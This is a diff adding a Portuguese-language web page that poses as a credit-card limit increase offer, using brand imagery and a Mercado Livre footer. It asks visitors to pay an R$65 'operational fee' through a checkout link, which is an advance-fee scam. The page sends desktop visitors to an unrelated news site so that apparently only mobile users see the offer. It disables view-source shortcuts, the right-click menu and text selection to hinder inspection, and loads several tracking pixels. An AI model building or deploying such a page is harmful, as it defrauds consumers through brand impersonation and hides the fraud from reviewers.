@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+    <meta charset="UTF-8">
+    <link href="npm/bootstrap%405.3.0/dist/css/bootstrap.min-28.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .header {
+            background: WHITE;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: black;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #ffd900;
+            font-weight: 500;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #ffd900 !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #ffd900;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        #conclusao {
+            display: none;
+            /* Esconde o elemento por padrão */
+        }
+
+        #conclusao h4 {
+            color: green;
+            /* Define a cor do texto */
+            font-weight: bold;
+            /* Define o texto em negrito */
+        }
+
+        .char {
+            border-top: solid px #00adca;
+            background-color: #00adca;
+            padding: 2px !important;
+        }
+
+        /* End custom CSS */
+    </style>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '729713382581372');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="tr-116?id=729713382581372&ev=PageView&noscript=1"></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else { //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+        body {
+            -webkit-touch-callout: none;
+            /* iOS Safari */
+            -webkit-user-select: none;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: none;
+            /* Konqueror */
+            -moz-user-select: none;
+            /* Firefox */
+            -ms-user-select: none;
+            /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+        input,
+        textarea {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: text;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: text;
+            /* Konqueror */
+            -moz-user-select: text;
+            /* Firefox */
+            -ms-user-select: text;
+            /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: all;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: all;
+            /* Konqueror */
+            -moz-user-select: all;
+            /* Firefox */
+            -ms-user-select: all;
+            /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else { //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+    <script type="text/javascript">
+        // Verifica o dispositivo e redireciona antes de carregar outros recursos
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+        }
+    </script>
+<script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+
+<body>
+    <div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+        <div class="header">
+            <img decoding="async" style="width: 120px;" src="https://i.postimg.cc/cLPm1HYx/VERIZON.png"
+                alt="Imagem Centralizada"
+                data-lazy-src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png"
+                data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;"
+                    src="lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000-15.png"
+                    alt="Imagem Centralizada"></noscript>
+        </div>
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div style="margin-top: 40px;" class="main-content text-center">
+                <h1 style="color: #089b08;">Ótimas notícias!</h1>
+                <p>Após uma nova análise automatizada, identificamos que você tem um limite maior disponível</p>
+                <p style="color: #111; font-weight: 500;">Somos obrigados a liberar o maior limite disponível para você,
+                    mas será necessário reenviar o pedido do cartão, inclusive o virtual, e infelizmente isso tem um
+                    pequeno custo (tarifa operacional: R$ 65,00)</p>
+
+                <h4 class="text-pink" style="font-weight: bold;color: #089b08;">Seu Novo Limite: R$ 9.600,00</h4>
+
+                <div style="border-radius: 20px;" class="card p-3 my-4">
+
+                    <p style="color: #ff4c29;font-weight: 600;">Além do seu limite aumentado, você recebe:</p>
+
+                    <ul class="text-start custom-list" style="list-style: none;">
+                        <li>
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                class="icon iconify iconify--ph" width="16" height="16" viewbox="0 0 256 256"
+                                style="vertical-align: middle; margin-right: 8px;">
+                                <path fill="#089b08"
+                                    d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                </path>
+                            </svg>Cartão Virtual para uso imediato (R$ 9.600,00 de limite)
+                        </li>
+                        <li>
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                class="icon iconify iconify--ph" width="16" height="16" viewbox="0 0 256 256"
+                                style="vertical-align: middle; margin-right: 8px;">
+                                <path fill="#089b08"
+                                    d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                </path>
+                            </svg>Acesso a empréstimo pessoal pré-aprovado de até 7 mil reais
+                        </li>
+                        <li>
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                class="icon iconify iconify--ph" width="16" height="16" viewbox="0 0 256 256"
+                                style="vertical-align: middle; margin-right: 8px;">
+                                <path fill="#089b08"
+                                    d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                </path>
+                            </svg>Cartão Virtual adicional com R$ 3.000,00 de limite pré-aprovado
+                        </li>
+
+                        <li>
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                class="icon iconify iconify--ph" width="16" height="16" viewbox="0 0 256 256"
+                                style="vertical-align: middle; margin-right: 8px;">
+                                <path fill="#089b08"
+                                    d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                </path>
+                            </svg>70% de desconto nos serviços de Streaming (Netflix, Amazon Prime, Disney Plus, HBO
+                            Max)
+                        </li>
+                    </ul>
+
+
+                    <div class="text-center">
+
+                    </div>
+
+                </div>
+
+                <p class="text-pink">Custo operacional do aumento de limite:</p>
+                <h3 class="text-pink"><strong>R$ 65,00</strong></h3><a
+                    href="./checkout/" style="text-decoration: none;"
+                    id="7c12fc44-d9b0-b81f-7fa8-c220c3779c57">
+                    <button type="button" id="ativarConta" class="btn btn-custom rounded-pill w-100 mt-3">Quero aumentar
+                        meu limite</button>
+                </a>
+            </div>
+        </div>
+
+        <div class="footer py-4" id="footerChg">
+            © 2025 Mercado Livre. CNPJ 68.694.585/0001-20. <br>
+            Todos os direitos reservados
+        </div>
+    </div>
+</body>
+
+
+</html>
